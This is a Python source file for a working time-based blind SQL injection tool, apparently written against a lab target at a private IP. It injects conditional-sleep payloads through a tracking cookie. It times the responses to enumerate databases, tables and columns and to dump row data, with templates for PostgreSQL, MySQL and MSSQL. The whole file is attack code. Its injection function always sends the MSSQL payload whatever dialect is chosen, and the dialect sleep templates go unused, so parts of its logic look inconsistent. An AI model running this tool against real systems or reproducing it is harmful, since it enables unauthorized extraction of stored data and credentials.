#!/usr/bin/python3
"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
        Time-Based Blind SQL Injection Framework
"""

import sys
import time
import requests
import argparse
import statistics
from urllib.parse import quote_plus

# ══════════════════════════════════════════════════════════════════
# ░░  CONFIGURE HERE  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

TARGET_URL = "http://10.129.204.202/login.php"    # <- change

SLEEP_TIME  = 3       # seconds to sleep when condition is TRUE
THRESHOLD   = 2.0     # seconds; response >= THRESHOLD => TRUE
                      # rule of thumb: SLEEP_TIME * 0.6 is a safe starting point
RETRIES     = 3       # retry ambiguous responses this many times
BASELINE    = None    # auto-calibrated on first run

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}  # uncomment for Burp

# ══════════════════════════════════════════════════════════════════
# ░░  DIALECT TEMPLATES  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

DIALECTS = {
    "postgresql": {
        "len"        : "LENGTH",
        "sleep"      : lambda n: f"pg_sleep({n})",
        "wrap"       : lambda cond, n: (
                           f"(SELECT CASE WHEN ({cond}) "
                           f"THEN pg_sleep({n}) ELSE pg_sleep(0) END)"
                       ),
        "current_db" : "current_database()",
        "list_dbs"   : "SELECT datname FROM pg_catalog.pg_database",
        "list_tables": lambda db: (
                           "SELECT table_name FROM information_schema.tables "
                           "WHERE table_schema='public'"
                       ),
        "list_cols"  : lambda db, tbl: (
                           f"SELECT column_name FROM information_schema.columns "
                           f"WHERE table_name='{tbl}'"
                       ),
        "row_count"  : lambda db, tbl: f"SELECT COUNT(*) FROM {tbl}",
        "nth_value"  : lambda col, tbl, n: (
                           f"SELECT {col} FROM {tbl} "
                           f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
                       ),
    },
    "mysql": {
        "len"        : "LENGTH",
        "sleep"      : lambda n: f"SLEEP({n})",
        "wrap"       : lambda cond, n: (
                           f"(SELECT IF(({cond}), SLEEP({n}), 0))"
                       ),
        "current_db" : "database()",
        "list_dbs"   : "SELECT schema_name FROM information_schema.schemata",
        "list_tables": lambda db: (
                           f"SELECT table_name FROM information_schema.tables "
                           f"WHERE table_schema='{db}'"
                       ),
        "list_cols"  : lambda db, tbl: (
                           f"SELECT column_name FROM information_schema.columns "
                           f"WHERE table_schema='{db}' AND table_name='{tbl}'"
                       ),
        "row_count"  : lambda db, tbl: f"SELECT COUNT(*) FROM {db}.{tbl}",
        "nth_value"  : lambda col, tbl, n: (
                           f"SELECT {col} FROM {tbl} LIMIT 1 OFFSET {n}"
                       ),
    },
    "mssql": {
        "len"        : "LEN",
        "sleep"      : lambda n: f"WAITFOR DELAY '0:0:{n}'",
        "wrap"       : lambda cond, n: (
                           f"(SELECT CASE WHEN ({cond}) "
                           f"THEN 1/0 ELSE 1 END)"   # error-based fallback;
                           # for pure time-based use the injection below instead:
                           # inject as stacked: '; IF (cond) WAITFOR DELAY '0:0:N'--
                       ),
        "current_db" : "db_name()",
        "list_dbs"   : "SELECT name FROM master.dbo.sysdatabases",
        "list_tables": lambda db: (
                           f"SELECT name FROM {db}..sysobjects WHERE xtype='U'"
                       ),
        "list_cols"  : lambda db, tbl: (
                           f"SELECT column_name FROM information_schema.columns "
                           f"WHERE table_catalog='{db}' AND table_name='{tbl}'"
                       ),
        "row_count"  : lambda db, tbl: f"SELECT COUNT(*) FROM {db}..{tbl}",
        "nth_value"  : lambda col, tbl, n: (
                           f"SELECT {col} FROM {tbl} "
                           f"ORDER BY (SELECT NULL) OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
                       ),
    },
}

DIALECT = "postgresql"
D = DIALECTS[DIALECT]


# ══════════════════════════════════════════════════════════════════
# ░░  ORACLE  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def _send(condition: str) -> float:
    payload = f"'%3b IF ({condition}) WAITFOR DELAY '0:0:{SLEEP_TIME}'--"
    cookies = {"TrackingId": payload}
    start = time.perf_counter()
    try:
        session.get(TARGET_URL, cookies=cookies, timeout=SLEEP_TIME + 10)
    except requests.exceptions.Timeout:
        return SLEEP_TIME + 10
    return time.perf_counter() - start


def calibrate(samples: int = 5) -> float:
    """
    Measure baseline RTT (condition=FALSE) over N samples.
    Sets the global THRESHOLD to baseline + SLEEP_TIME * 0.5.
    """
    global THRESHOLD, BASELINE
    print(f"  [*] Calibrating baseline over {samples} requests...")
    times = []
    for _ in range(samples):
        t = _send("1=0")   # always false -> no sleep
        times.append(t)
        print(f"      RTT: {t:.3f}s")
    BASELINE = statistics.median(times)
    THRESHOLD = BASELINE + SLEEP_TIME * 0.5
    print(f"  [*] Baseline: {BASELINE:.3f}s  |  Threshold set to: {THRESHOLD:.3f}s\n")
    return THRESHOLD


def oracle(condition: str) -> bool:
    """
    Returns True if condition is TRUE in the DB.
    Retries on ambiguous responses (near the threshold).
    """
    ambiguous_zone = 0.5   # seconds around threshold considered ambiguous

    elapsed = _send(condition)
    result  = elapsed >= THRESHOLD

    # If response time lands in the ambiguous zone, retry to confirm
    if abs(elapsed - THRESHOLD) < ambiguous_zone:
        votes = [result]
        for _ in range(RETRIES - 1):
            t = _send(condition)
            votes.append(t >= THRESHOLD)
        result = votes.count(True) > votes.count(False)

    return result


# ══════════════════════════════════════════════════════════════════
# ░░  CORE ENGINE  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

# NOTE: Time-based oracles are inherently sequential.
# Parallel requests cause compounded sleep times on the server,
# producing false positives. Each request must complete before the next.

def dump_int(query: str, lo: int = 0, hi: int = 512) -> int:
    """Binary search for an integer result. Sequential."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({query}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def dump_string(query: str, length: int = None) -> str:
    """
    Extract a string via bitwise per-character. Sequential.

    7 requests per character — same bit-decomposition as the boolean
    version, but strictly sequential to avoid compounding sleeps.
    """
    LEN_FN = D["len"]
    if length is None:
        length = dump_int(f"{LEN_FN}(({query}))")
    if length == 0:
        return ""

    result = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))&{1 << p}>0"):
                c |= (1 << p)
        char = chr(c) if 32 <= c <= 126 else f"\\x{c:02x}"
        result += char
        print(f"  [*] pos={i}/{length} -> {result}", end="\r")

    print()
    return result


def dump_list(count_query: str, nth_query_fn) -> list[str]:
    """Enumerate a list of strings sequentially."""
    count = dump_int(count_query)
    print(f"  [*] Count: {count}")
    results = []
    for n in range(count):
        q = nth_query_fn(n)
        length = dump_int(f"{D['len']}(({q}))")
        val = dump_string(q, length=length)
        print(f"  [+] [{n+1}/{count}] {val}")
        results.append(val)
    return results


# ══════════════════════════════════════════════════════════════════
# ░░  MENU ACTIONS  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def action_test():
    print("\n[*] Calibrating and running oracle self-test")
    calibrate()
    t = oracle("1=1")
    f = oracle("1=0")
    print(f"  1=1 -> {t}  |  1=0 -> {f}")
    if t and not f:
        print("  [+] Oracle is working correctly\n")
    else:
        print("  [-] Oracle misconfigured — adjust SLEEP_TIME or injection payload\n")
        sys.exit(1)


def action_current_db():
    print("\n[*] Current database")
    name = dump_string(D["current_db"])
    print(f"  [+] Current DB -> {name}\n")
    return name


def action_list_dbs():
    print("\n[*] Enumerate databases")
    lq  = D["list_dbs"]
    count_q = f"SELECT COUNT(*) FROM ({lq}) x"
    nth = lambda n: (
        f"SELECT datname FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT == "postgresql" else
        f"SELECT table_schema FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT == "mysql" else
        f"SELECT TOP 1 name FROM ({lq}) x "
        f"WHERE name NOT IN (SELECT TOP {n} name FROM ({lq}) y ORDER BY name) "
        f"ORDER BY name"
    )
    dbs = dump_list(count_q, nth)
    print(f"  [+] Databases: {dbs}\n")
    return dbs


def action_list_tables():
    db = input("  Database name : ").strip()
    print(f"\n[*] Tables in [{db}]")
    lq = D["list_tables"](db)
    count_q = f"SELECT COUNT(*) FROM ({lq}) x"
    nth = lambda n: (
        f"SELECT table_name FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT in ("postgresql", "mysql") else
        f"SELECT TOP 1 name FROM ({lq}) x "
        f"WHERE name NOT IN (SELECT TOP {n} name FROM ({lq}) y ORDER BY name) "
        f"ORDER BY name"
    )
    tables = dump_list(count_q, nth)
    print(f"  [+] Tables: {tables}\n")
    return tables


def action_list_columns():
    db    = input("  Database name : ").strip()
    table = input("  Table name    : ").strip()
    print(f"\n[*] Columns in [{db}].[{table}]")
    lq = D["list_cols"](db, table)
    count_q = f"SELECT COUNT(*) FROM ({lq}) x"
    nth = lambda n: (
        f"SELECT column_name FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT in ("postgresql", "mysql") else
        f"SELECT TOP 1 column_name FROM ({lq}) x "
        f"WHERE column_name NOT IN (SELECT TOP {n} column_name FROM ({lq}) y ORDER BY column_name) "
        f"ORDER BY column_name"
    )
    cols = dump_list(count_q, nth)
    print(f"  [+] Columns: {cols}\n")
    return cols


def action_dump_data():
    db     = input("  Database name   : ").strip()
    table  = input("  Table name      : ").strip()
    column = input("  Column name(s)  : ").strip()
    print(f"\n[*] Dumping [{column}] from [{table}]")

    row_count = dump_int(D["row_count"](db, table))
    print(f"  [*] Rows: {row_count}")

    results = []
    for n in range(row_count):
        q = D["nth_value"](column, table, n)
        length = dump_int(f"{D['len']}(({q}))")
        val = dump_string(q, length=length)
        print(f"  [+] Row[{n}] -> {val}")
        results.append(val)

    print(f"\n  [+] Dump complete: {results}\n")
    return results


# ══════════════════════════════════════════════════════════════════
# ░░  ENTRYPOINT  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

BANNER = r"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
          Time-Based Blind SQL Injection Framework
"""

MENU = """
    (0) Oracle
    (1) Current database
    (2) List all databases
    (3) List tables
    (4) List columns
    (5) Dump data

  Your choice : """


def main():
    parser = argparse.ArgumentParser(description="SQLM0US3 — Time-Based Blind SQLi")
    parser.add_argument("--dialect", choices=["postgresql", "mysql", "mssql"],
                        default="postgresql", help="SQL dialect (default: postgresql)")
    parser.add_argument("--sleep", type=int, default=3,
                        help="Sleep duration in seconds (default: 3)")
    parser.add_argument("--threshold", type=float, default=None,
                        help="Manual threshold in seconds (default: auto-calibrate)")
    parser.add_argument("--retries", type=int, default=3,
                        help="Retries for ambiguous responses (default: 3)")
    args = parser.parse_args()

    global DIALECT, D, SLEEP_TIME, THRESHOLD, RETRIES
    DIALECT    = args.dialect
    D          = DIALECTS[DIALECT]
    SLEEP_TIME = args.sleep
    RETRIES    = args.retries

    print(BANNER)
    print(f"  Dialect : {DIALECT.upper()}   Sleep : {SLEEP_TIME}s   Retries : {RETRIES}")

    if args.threshold is not None:
        THRESHOLD = args.threshold
        print(f"  Threshold : {THRESHOLD}s (manual)\n")
    else:
        calibrate()

    choice = int(input(MENU))

    actions = {
        0: action_test,
        1: action_current_db,
        2: action_list_dbs,
        3: action_list_tables,
        4: action_list_columns,
        5: action_dump_data,
    }

    if choice in actions:
        actions[choice]()
    else:
        print("  [-] Invalid option")


if __name__ == "__main__":
    main()
